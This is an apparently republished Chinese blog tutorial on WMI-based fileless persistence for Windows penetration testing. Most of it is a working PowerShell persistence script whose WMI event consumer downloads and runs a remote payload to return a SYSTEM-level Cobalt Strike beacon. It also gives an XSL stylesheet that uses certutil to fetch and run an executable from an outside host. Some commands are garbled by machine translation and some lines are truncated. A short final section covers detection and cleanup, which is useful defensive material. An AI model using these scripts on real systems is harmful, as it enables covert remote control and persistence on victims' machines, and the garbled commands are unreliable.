> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/VLyxwXQtdvUPlkIRu6yfMg)

0x01前言

  

  

    WMIC扩展WMI（Windows管理规范，Windows管理工具），提供从命令行界面和批处理脚本执行系统管理的支持。  

    在2015年的blackhat大会上Matt Matteber介绍了一种无文件后门就是用的wmi。

```
HTTPS：//www.blackhat.com/docs/us-15/materials/us-15-Graeber-Abusing-Windows-Management-Instrumentation-WMI-To-Build-A-Persistent%20Asynchronous-And-Fileless-Backdoor- wp.​​pdf
```

    WMI可以描述为一组管理Windows系统的方法和功能。我们可以把它当作API来与Windows系统进行相互交流。WMI在渗透测试中的价值在于它不需要下载和安装，因为WMI是Windows系统自带功能。而且整个运行过程都在计算机内存中发生，不会留下任何痕迹。

0x02 wmi常见使用

  

  

**检索系统信息**  

 **1，检索系统已安装的软件，会有点慢。**

```
wmic产品列表简介|更多
```

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ08VU7YeXnWCic7fP0RlC8eh4iacwzmrwcDcNLnlkIvWfD5ic5I2nWG4UPsM8IhhZ402UF9DM7S69Mrdg/640?wx_fmt=png)

 **2，搜索系统运行服务。**

```
wmic服务清单简介|更多
```

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ08VU7YeXnWCic7fP0RlC8eh4d3NjI4u6T4AzLt7woImjUZ1nFjjojiatJUFu7icPVNxr7phMbcbjxMGA/640?wx_fmt=png)  

 **3，搜索启动程序。**

```
wmic启动列表摘要|更多
```

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ08VU7YeXnWCic7fP0RlC8eh4Yhu8UUzyZJUUibemibro3KdMD3zIoObDjPEe0iaATZRye0UqWy9d4OOyw/640?wx_fmt=png)  

 **4，搜索计算机域控制器。**

```
Wmic ntdomain列表简介
```

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ08VU7YeXnWCic7fP0RlC8eh4GpzV9O1ARcVUgBuicevZL3x0afYUvD5GprhM9AmEhicDDeuEOyNUld2g/640?wx_fmt=png)  

0x03 wmi事件利用达到cs的beacon上线

  

  

    如下是 WMI-Persistence.ps1 脚本，代码非常简单，三个函数分别是插入指定 wmi 事件，删除指定 wmi 事件，然后查询 wmi 事件，需要改的地方就一处，即加粗的远程有效负载地址。

    当然，事件名也可以改成自己想要的，不过即使不改也没啥太大关系，一眼看不太出来。

```
#
1.  function Install-Persistence{
2.   
3.     $Payload = "<strong>((new-object net.webclient).downloadstring('http://192.168.3.68:80/logo.gif'))</strong>"
4.     $EventFilterName = 'Cleanup'
5.     $EventConsumerName = 'DataCleanup'
6.     $finalPayload = "<strong>powershell.exe -nop -c `"IEX $Payload`"</strong>"
7.   
8.     # Create event filter
9.     $EventFilterArgs = @{
10.       EventNamespace = 'root/cimv2'
11.       Name = $EventFilterName
12.       Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"
13.       QueryLanguage = 'WQL'
14.   }
15. 
16.   $Filter = Set-WmiInstance -Namespace root/subscription -Class __EventFilter -Arguments $EventFilterArgs
17. 
18.   # Create CommandLineEventConsumer
19.   $CommandLineConsumerArgs = @{
20.       Name = $EventConsumerName
21.       CommandLineTemplate = $finalPayload
22.   }
23.   $Consumer = Set-WmiInstance -Namespace root/subscription -Class CommandLineEventConsumer -Arguments $CommandLineConsumerArgs
24. 
25.   # Create FilterToConsumerBinding
26.   $FilterToConsumerArgs = @{
27.       Filter = $Filter
28.       Consumer = $Consumer
29.   }
30.   $FilterToConsumerBinding = Set-WmiInstance -Namespace root/subscription -Class __FilterToConsumerBinding -Arguments $FilterToConsumerArgs
31. 
32.   #Confirm the Event Filter was created
33.   $EventCheck = Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter "Name = '$EventFilterName'"
34.   if ($EventCheck -ne $null) {
35.       Write-Host "Event Filter $EventFilterName successfully written to host"
36.   }
37. 
38.   #Confirm the Event Consumer was created
39.   $ConsumerCheck = Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer -Filter "Name = '$EventConsumerName'"
40.   if ($ConsumerCheck -ne $null) {
41.       Write-Host "Event Consumer $EventConsumerName successfully written to host"
42.   }
43. 
44.   #Confirm the FiltertoConsumer was created
45.   $BindingCheck = Get-WmiObject -Namespace root/subscription -Class __FilterToConsumerBinding -Filter "Filter = ""__eventfilter.
46.   if ($BindingCheck -ne $null){
47.       Write-Host "Filter To Consumer Binding successfully written to host"
48.   }
49. 
50.}
```

```
#
1.  function Remove-Persistence{
2.     $EventFilterName = 'Cleanup'
3.     $EventConsumerName = 'DataCleanup'
4.   
5.     # Clean up Code - Comment this code out when you are installing persistence otherwise it will
6.   
7.     $EventConsumerToCleanup = Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer -Filter "Name = '$EventConsumerName'"
8.     $EventFilterToCleanup = Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter "Name = '$EventFilterName'"
9.     $FilterConsumerBindingToCleanup = Get-WmiObject -Namespace root/subscription -Query "REFERENCES OF {$($EventConsumerToCleanup.__RELPATH)} WHERE ResultClass = __FilterToConsumerBinding"
10. 
11.   $FilterConsumerBindingToCleanup | Remove-WmiObject
12.   $EventConsumerToCleanup | Remove-WmiObject
13.   $EventFilterToCleanup | Remove-WmiObject
14. 
15.}
```

```
#
1.  function Check-WMI{
2.     Write-Host "Showing All Root Event Filters"
3.     Get-WmiObject -Namespace root/subscription -Class __EventFilter
4.   
5.     Write-Host "Showing All CommandLine Event Consumers"
6.     Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer
7.   
8.     Write-Host "Showing All Filter to Consumer Bindings"
9.     Get-WmiObject -Namespace root/subscription -Class __FilterToConsumerBinding
10.}
```

    然后开始插入事件, 一旦正常插入成功后, 当目标再次重启系统, 管理员 [administrator] 正常登录, 稍等片刻 [如果是 server2016 的话可能要稍微多等会儿] 当系统在后台轮询到我们的 payload 事件后, 便会被触发执行.  

```
#
1.  PS > Import-Module .\WMI-Persistence.ps1
2.  PS > Install-Persistence
3.  PS > Check-WMI
```

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ08VU7YeXnWCic7fP0RlC8eh4icXSaRHCyhdOsgG0ClQKPFhqSJgABWbcpuuCM4a5MZl7ibkQ3Zna0euw/640?wx_fmt=png)  

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ08VU7YeXnWCic7fP0RlC8eh4icXSaRHCyhdOsgG0ClQKPFhqSJgABWbcpuuCM4a5MZl7ibkQ3Zna0euw/640?wx_fmt=png)

    随之, system 权限的 beacon 被正常弹回.

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ08VU7YeXnWCic7fP0RlC8eh42YWs4tMMEb8Yb0L2ZI62txtniaJzzhyTHwfibibJLpLTbwU1lf2SlXxFQ/640?wx_fmt=png)

0x04 配合 certutil 达到自定义上线

  

  

    我们还可以使用 wmi 的远程加载功能.  

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ08VU7YeXnWCic7fP0RlC8eh4eoZL4eyL5iaowpRzVd34beNM8Aicg4pe7ndIgYwuErEN3fWCCYHyeO3A/640?wx_fmt=png)

    wmi.xsl 实现的功能很明了, 即 certutil 下载者.

```
#
1.  <?xml version='1.0'?>
2.   
3.  <stylesheet
4.   
5.  xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt"
6.   
7.  xmlns:user="placeholder"
8.   
9.  version="1.0">
10. 
11.<output method="text"/>
12. 
13.   <ms:script implements-prefix="user" language="JScript">
14. 
15.   <![CDATA[
16. 
17.   var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /c certutil -urlcache -split -f <strong>http://*/load.jpg</strong> %temp%/load.exe & %temp%/load.exe & certutil.exe -urlcache -split -f http://*/load.jpg delete",0);
18. 
19.   ]]> </ms:script>
20. 
21.</stylesheet>
```

    修改 WMI-Persistence.ps1 脚本, 只需把 payload 部分换下就行, 别的不需要动.  

```
wmic osget /FORMAT:"http://192.168.3.68:80/wmi.xsl"
```

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ08VU7YeXnWCic7fP0RlC8eh43SLwiclxswdpQeW5tRUuxYsbpHT128P9GvnZbpQfYSKfMiaPeB0rvsZQ/640?wx_fmt=png)  

```
#
1.  powershell -exec bypass
2.   PS > Import-Module .\WMI-Persistence.ps1
3.   PS > Install-Persistence
4.   PS > Check-WMI
5.   PS > Remove-Persistence  用完以后务必要记得随手删掉
```

    也可以达到自定义上线的目的.  

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ08VU7YeXnWCic7fP0RlC8eh434G9te61y07oicA3AVpicn1Bro1YCpp9iaBvdTDfw80m4wGzffgMKnRaQ/640?wx_fmt=png)

0x05 WMI 后门检测及清除

  

  

**查看当前 WMI Event**

    【管理员权限】

```
1. #List Event Filters
2. Get-WMIObject -Namespace root\Subscription -Class __EventFilter
3. 
4. #List Event Consumers
5. Get-WMIObject -Namespace root\Subscription -Class __EventConsumer
6.   
7. #List Event Bindings
8. Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding
```

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ08VU7YeXnWCic7fP0RlC8eh4fOaZ43oiaycRzOqmGnwcF1J6aIza1ATCTu0eNYjdEZX7c9iaWkmRgYiaQ/640?wx_fmt=png)  

**清除后门**

    【管理员权限】

```
1.  #Filter
2.  Get-WMIObject -Namespace root\Subscription -Class __EventFilter -Filter " | Remove-WmiObject -Verbose
3.   
4.  #Consumer
5.  Get-WMIObject -Namespace root\Subscription -Class CommandLineEventConsumer -Filter " | Remove-WmiObject -Verbose
6.   
7.  #Binding
8.  Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding -Filter "__Path LIKE '%
```

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ08VU7YeXnWCic7fP0RlC8eh4XNsqTDQPJqhdESGicPUYtmmzKpFwZFZeiccdeHibQRCB8U4yAkz7IvS2Q/640?wx_fmt=png)  

end

  

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0icsdQH77IW1At3Wh20omQX8ygAwqjmPibDNsRzunU1TvRUtlCz3LWBRRrk4D9manIn7dZrHQH0LmdA/640?wx_fmt=png)